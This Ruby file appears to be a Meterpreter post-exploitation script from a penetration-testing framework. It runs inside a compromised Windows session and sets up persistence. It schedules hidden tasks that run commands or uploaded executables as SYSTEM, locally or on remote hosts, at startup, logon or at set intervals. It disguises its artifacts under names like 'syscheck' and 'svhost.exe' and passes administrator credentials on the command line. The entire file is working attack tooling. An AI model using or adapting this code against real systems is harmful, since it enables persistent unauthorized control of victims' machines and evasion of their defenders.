#!/usr/bin/env ruby

#Meterpreter script for automating the most common scheduling tasks
#during a pentest. This script will use the schtasks command so as
#to provide future compatibility since MS will retire the AT command
#in future versions of windows. This script works with Windows XP,
#Windows 2003, Windows Vista and Windows 2008.
#Verion: 0.1.2
#Note: in Vista UAC must be disabled to be able to perform scheduling
#and the meterpreter must be running under the profile of local admin
#or system.
################## Variable Declarations ##################
session = client
@@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false,"Help menu."                        ],
	"-c" => [ true,"Command to execute at the given time. If options for execution needed use double quotes"],
	"-d" => [ false,"Daily."  ],
	"-hr" => [ true,"Every specified hours 1-23."],
	"-m" => [ true, "Every specified amount of minutes 1-1439"],
	"-e" => [ true, "Executable or script to upload to target host, will not work with remote schedule"],
	"-l" => [ false,"When a user logs on."],
	"-o" => [ true,"Options for executable when upload method used"],
	"-s" => [ false,"At system startup."],
	"-i" => [ false,"Run command imediatly and only once."],
	"-r" => [ false,"Remote Schedule. Executable has to be already on remote target"],
	"-u" => [ false,"Username of account with administrative privelages."],
	"-p" => [ false,"Password for account provided."],
	"-t" => [ true,"Remote system to schedule job."]
)
################## function declaration Declarations ##################
def usage()
	print(
		"Scheduleme Meterpreter Script\n" +
		  "This script provides most common scheduling types used during a pentest.\n"+
		  "It has the functionality to upload a desired executable or script and schedule\n"+
		  "the file uploaded. All scheduled task are as System so Meterpreter process must\n"+
		  "be System or local admin for local schedules and Administrator for remore shcedules\n"
	)
	puts "\t-h \t\tHelp menu."
	puts "\t-c <opt>\tCommand to execute at the given time. If options for execution needed use double quotes"
	puts "\t-d \t\tDaily."
	puts "\t-hr <opt> \tEvery specified hours 1-23."
	puts "\t-m <opt> \tEvery specified amount of minutes 1-1439"
	puts "\t-l \t\tWhen a user logs on."
	puts "\t-s \t\tAt system startup."
	puts "\t-i \t\tRun command imediatly and only once."
	puts "\t-r \t\tRemote Schedule. Executable has to be already on remote target"
	puts "\t-e <opt> \tExecutable or script to upload to target host, will not work with remote schedule"
	puts "\t-o <opt> \tOptions for executable when upload method used"
	puts "\t-u \t\tUsername of account with administrative privelages."
	puts "\t-p \t\tPassword for account provided."
	puts "\t-t <opt> \tRemote system to schedule job."
end
#---------------------------------------------------------------------------------------------------------
def checkuac(session)
	uac = false
        winversion = session.sys.config.sysinfo
        if winversion['OS']=~ /Windows Vista/ or  winversion['OS']=~ /Windows 7/
                if session.sys.config.getuid != "NT AUTHORITY\\SYSTEM"
                        begin
                                print_status("Checking if UAC is enabled .....")
                                key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                                if key.query_value('Identifier') == 1
                                        print_status("UAC is Enabled")
                                        uac = true
                                end
                                key.close
                        rescue::Exception => e
                                print_status("Error Checking UAC: #{e.class} #{e}")
                        end
                end
        end
        return uac
end
#---------------------------------------------------------------------------------------------------------
def scheduleme(session,schtype,cmd,tmmod,cmdopt,username,password)
	execmd = ""
	success = false
	taskname = "syscheck#{rand(100)}"
	if cmdopt != nil
		cmd = "#{cmd} #{cmdopt}"
	end
	case schtype
	when "startup"
		if username == nil
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc onstart /ru system"
		else
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc onstart /ru system /u #{username} /p #{password}"
		end
	when "login"
		if username == nil
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc onlogon /ru system"
		else
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc onlogon /ru system /u #{username} /p #{password}"
		end
	when "hourly"
		if username == nil
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc hourly /mo #{tmmod} /ru system"
		else
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc hourly /mo #{tmmod} /ru system /u #{username} /p #{password}"
		end
	when "daily"
		if username == nil
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc daily /mo #{tmmod} /ru system"
		else
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc daily /mo #{tmmod} /ru system /u #{username} /p #{password}"
		end
	when "minute"
		if username == nil
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\"  /sc minute /mo #{tmmod} /ru system"
		else
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\"  /sc minute /mo #{tmmod} /ru system /u #{username} /p #{password}"
		end
	when "now"
		if username == nil
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\"  /sc once /ru system /st 00:00:00"
		else
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\"  /sc once /ru system /st 00:00:00 /u #{username} /p #{password}"
		end
	end
	print_status("Scheduling command #{cmd} to run #{schtype}.....")
	r = session.sys.process.execute("cmd.exe /c #{execmd}", nil, {'Hidden' => 'true','Channelized' => true})
	while(d = r.channel.read)
		if d =~ /successfully been created/
			print_status("The scheduled task has been successfully created")
			if username == nil
				print_status("For cleanup run schtasks /delete /tn #{taskname} /F")
			else
				print_status("For cleanup run schtasks /delete /tn #{taskname} /u #{username} /p #{password} /F")
			end
			success = true
		end
	end
	if !success
		print_status("Failed to create scheduled task!!")
	elsif success && schtype == "now"
		if username == nil
			session.sys.process.execute("cmd.exe /c schtasks /run /tn #{taskname}")
		else
			session.sys.process.execute("cmd.exe /c schtasks /run /tn #{taskname} /u #{username} /p #{password}")
		end
	end
	r.channel.close
	r.close

end
#---------------------------------------------------------------------------------------------------------
def scheduleremote(session,schtype,cmd,tmmod,cmdopt,targetsys,username,password)
	execmd = ""
	success = false
	taskname = "syscheck#{rand(100)}"
	if cmdopt != nil
		cmd = "#{cmd} #{cmdopt}"
	end
	case schtype
	when "startup"
		if username == nil
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc onstart /s #{targetsys} /ru system "
		else
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc onstart /s #{targetsys} /u #{username} /p #{password} /ru system "
		end
	when "login"
		if username == nil
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc onlogon /s #{targetsys} /ru system "
		else
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc onlogon /s #{targetsys} /u #{username} /p #{password} /ru system "
		end
	when "hourly"
		if username == nil
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc hourly /mo #{tmmod} /ru system /s #{targetsys}"
		else
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc hourly /mo #{tmmod} /ru system /s #{targetsys} /u #{username} /p #{password}"
		end
	when "daily"
		if username == nil
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc daily /mo #{tmmod} /ru system /s #{targetsys}"
		else
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\" /sc daily /mo #{tmmod} /ru system /s #{targetsys} /u #{username} /p #{password}"
		end
	when "minute"
		if username == nil
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\"  /sc minute /mo #{tmmod} /ru system /s #{targetsys}"
		else
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\"  /sc minute /mo #{tmmod} /ru system /s #{targetsys} /u #{username} /p #{password}"
		end
	when "now"
		if username == nil
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\"  /sc once /ru system /s #{targetsys} /st 00:00:00"
		else
			execmd = "schtasks /create /tn \"#{taskname}\" /tr \"#{cmd}\"  /sc once /ru system /s #{targetsys} /st 00:00:00 /u #{username} /p #{password}"
		end
	end
	print_status("Scheduling command #{cmd} to run #{schtype}.....")
	r = session.sys.process.execute("cmd.exe /c #{execmd}", nil, {'Hidden' => 'true','Channelized' => true})
	while(d = r.channel.read)
		if d =~ /successfully been created/
			print_status("The scheduled task has been successfully created")
			print_status("For cleanup run schtasks /delete /tn #{taskname} /s #{targetsys}  /u #{username} /p #{password} /F")
			success = true
		end
	end
	if !success
		print_status("Failed to create scheduled task!!")
	elsif success && schtype == "now"
		if username == nil
			session.sys.process.execute("cmd.exe /c schtasks /run /tn #{taskname} /s #{targetsys}")
		else
			session.sys.process.execute("cmd.exe /c schtasks /run /tn #{taskname} /s #{targetsys} /u #{username} /p #{password}")
		end
	end
	r.channel.close
	r.close

end
#---------------------------------------------------------------------------------------------------------

def upload(session,file)
	location = session.fs.file.expand_path("%TEMP%")
	fileontrgt = "#{location}\\svhost#{rand(100)}.exe"
	print_status("Uploading #{file}....")
	session.fs.file.upload_file("#{fileontrgt}","#{file}")
	print_status("#{file} uploaded!")
	return fileontrgt
end
# Parsing of Options
cmd = nil
file = nil
schtype = ""
tmmod = ""
cmdopt = nil
helpcall = 0
remote = 0
targetsys = nil
username = nil
password = nil
@@exec_opts.parse(args) { |opt, idx, val|
	case opt

	when "-c"
		cmd = val
	when "-e"
		file = val
	when "-d"
		tmmod = val
		schtype = "daily"
	when "-hr"
		tmmod = val
		schtype = "hourly"
	when "-m"
		tmmod = val
		schtype = "minute"
	when "-s"
		schtype = "startup"
	when "-l"
		schtype = "login"
	when "-i"
		schtype = "now"
	when "-o"
		cmdopt = val
	when "-r"
		remote = 1
	when "-t"
		targetsys = val
	when "-u"
		username = val
	when "-p"
		password = val
	when "-h"
		helpcall = 1
	end

}
if helpcall == 1 
	usage()
elsif cmd == nil && file == nil
	usage()
elsif !checkuac(session)
	if file == nil
		if remote == 0
			scheduleme(session,schtype,cmd,tmmod,cmdopt,username,password)
		else
			scheduleremote(session,schtype,cmd,tmmod,cmdopt,targetsys,username,password)
		end
	else
		cmd = upload(session,file)
		scheduleme(session,schtype,cmd,tmmod,cmdopt,username,password)
	end
else
	print_status("Meterpreter is not running under sufficient administrative rights.")
end
